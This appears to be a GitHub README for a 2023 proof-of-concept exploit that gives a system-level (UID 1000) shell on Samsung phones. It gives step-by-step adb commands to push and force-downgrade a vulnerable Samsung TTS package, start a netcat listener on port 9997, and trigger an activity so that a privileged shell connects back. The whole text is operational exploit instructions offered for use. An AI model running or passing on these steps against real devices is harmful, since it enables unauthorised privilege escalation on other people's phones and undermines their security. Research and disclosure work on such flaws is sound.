# K0mraid3s_System_Shell-Source
 Source code for K0mraid3s 2023 System Shell PoC
As seen on XDA https://forum.xda-developers.com/t/system-shell-exploit-all-samsung-mobile-devices-no-bl-unlock-required.4543071/

If you just need this prebuilt, see this repo https://github.com/k0mraid3/K0mraid3s-System-Shell

This PoC Should point at localhost port 9997, so nc -lp 9997 into it once built. 

Step 1 - Install the included "komraids_POC_V1.6.apk" to the device, then push the included "samsungTTSVULN2.apk" to /data/local/tmp (adb push samsungTTSVULN2.apk /data/local/tmp) -> Chmod 777 /data/local/tmp/samsungTTSVULN2.apk >>> I advice disabling all battery optimizations for Samsung TTS and Shell, otherwise, it cuts off the shell from time to time.

Step 2 - Make sure ADB is on, Connected and authorized and all power saving is off (as mentioned above) Reboot device.

Step 4 - When device reboots, run this command from ADB. adb shell pm install -r -d -f -g --full --install-reason 3 --enable-rollback /data/local/tmp/samsungTTSVULN2.apk ---> it will return "Success" when done.

Step 5 - Now, open two shells, in the first, do nc -lp 9997 & in the second, do am start -n com.samsung.SMT/.gui.DownloadList -> Look back at the first shell., it should have opened into a new system (UID 1000) shell.
